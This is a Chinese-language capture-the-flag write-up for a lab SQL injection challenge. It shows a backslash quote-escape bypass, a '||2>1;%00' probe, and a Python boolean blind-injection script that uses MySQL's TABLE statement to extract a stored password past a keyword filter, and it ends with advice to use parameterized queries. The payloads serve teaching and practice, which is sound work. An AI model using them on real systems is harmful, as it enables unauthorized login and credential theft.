# MiniLCTF2022 mini_sql Writeup

## 题目简述

登录接口把输入直接拼入：

```sql
select * from users where username='$username' and password='$password';
```

WAF 过滤了 `union`、`select`、`and`、`or` 等常见词，但保留反斜杠、`||`、`mid`、`length`、分号和空字节。MySQL 版本还支持独立的 `TABLE` 语句，因此可先用转义重组查询，再以布尔盲注恢复账户字段。

## 解题过程

令用户名以反斜杠结尾：

```text
username=admin\
```

原本闭合用户名的单引号被转义，密码字段开头的单引号转而结束这个字符串。密码参数便可从 `||` 开始控制布尔表达式，并用 `;%00` 截断剩余语句。探针为：

```text
password=||2>1;%00
```

页面出现 `success!`，证明注入成立。利用 `length(username)` 与 `mid(username,位置,1)` 可得当前匹配行用户名长度为 19，逐字节恢复为：

```text
w3lc0me_t0_m1n1lct5
```

因为 `password` 一词中的 `or` 也会触发过滤，不能直接引用该列。MySQL 8.0.19 及以上支持 `TABLE users`，它无需写 `select` 或列名即可返回整行。用行比较与 `binary` 前缀做字典序盲注：

```python
alphabet = "/0123456789:;ABCDEFGHIJKLMNOPQRSTUVWXYZ_`abcdefghijklmnopqrstuvwxyz.{|}~"
known = ""
for _ in range(100):
    for ch in alphabet:
        guess = known + ch
        payload = (
            '||((1,"w3lc0me_t0_m1n1lct5",binary"%s")'
            '<=(table users limit 0,1));%%00' % guess
        )
        if "success!" not in post(username="admin\\", password=payload):
            known += chr(ord(ch) - 1)
            break
```

恢复出的密码为：

```text
cd51c1005cab68be2f7e6112a4de3e89
```

用恢复的用户名和密码正常登录即可取得 flag。原 WP 的 fuzz 图只包含过滤词文本，已转写而未保留图片。

## 方法总结

关键不是逐个绕过被禁关键字，而是重建最终 SQL 的引号结构：反斜杠让两个输入字段跨界，`||` 提供布尔条件，空字节处理尾部。随后利用 MySQL 新语法 `TABLE` 避开 `select` 与敏感列名。防御上应使用参数化查询，并把认证结果绑定到唯一行；黑名单既有语法缺口，也会误伤普通列名，无法替代预编译语句。
